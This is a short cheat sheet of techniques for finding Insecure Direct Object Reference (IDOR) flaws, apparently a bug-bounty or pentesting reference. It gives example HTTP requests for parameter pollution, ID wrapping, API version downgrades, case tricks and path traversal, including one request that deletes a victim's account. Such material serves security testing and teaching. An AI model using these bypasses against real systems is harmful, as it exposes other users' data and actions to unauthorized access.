# IDOR
## IDOR (Insecure Direct Object Reference)

Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly. The term IDOR was popularized by its appearance in the OWASP 2007 Top Ten. However, it is just one example of many access control implementation mistakes that can lead to access controls being circumvented. IDOR vulnerabilities are most commonly associated with horizontal privilege escalation, but they can also arise in relation to vertical privilege escalation.

## 1. Bypassing Object Level Authorization:
```
Add parameters onto the endpoints for example, if there was
GET /api/v1/getuser                 >>>      GET /api/v1/getuser?id=1234
GET /api_v1/messages --> 401        >>>      GET /api_v1/messages?user_id=victim_uuid --> 200
vs 

```
## 2. HTTP Parameter pollution
```
GET /api_v1/messages?user_id=VICTIM_ID --> 401 Unauthorized
GET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID --> 200 OK
GET /api_v1/messages?user_id=YOUR_USER_ID[]&user_id=ANOTHER_USERS_ID[]

JSON 
POST /api/get_profile
[...]
{"user_id":"hacker_id","user_id":"victim_id"}
```

## 3. Add .json to the endpoint
```
GET /v2/GetData/1234  >>> GET /v2/GetData/1234.json
[...]
```

## 4. Test on outdated API Versions
```
POST /v2/GetData                 POST /v1/GetData
[...]                  >>>>      [...]
id=123                           id=123
```
## 5. Wrap the ID with an array.
```
{“id”:111} --> 401 Unauthriozied
{“id”:[111]} --> 200 OK
```

## 6. Wrap the ID with a JSON object
```
{“id”:111} --> 401 Unauthriozied
{“id”:{“id”:111}} --> 200 OK
```

## 7. Try decode the ID, if the ID encoded using md5,base64,etc
```html
GET /GetUser/dmljdGltQG1haWwuY29t
dmljdGltQG1haWwuY29t => victim@mail.com
```
## 8. If the website using graphql, try to find IDOR using graphql!
```html
GET /graphql            --> 401 Unauthorized
GET /graphql.php?query= --> 200 OK
```

## 9. MFLAC (Missing Function Level Access Control)
```
GET /admin/profile --> 401 Unauthorized
GET /ADMIN/profile --> 200 OK
```
## 10. Path Traversal: 
    POST /users/delete/VICTIM_ID --> 403 Forbidden
    POST /users/delete/MY_ID/../VICTIM_ID --> 200 OK 


Source: https://www.notion.so/IDOR-Attack-vectors-exploitation-bypasses-and-chains-0b73eb18e9b640ce8c337af83f397a6b
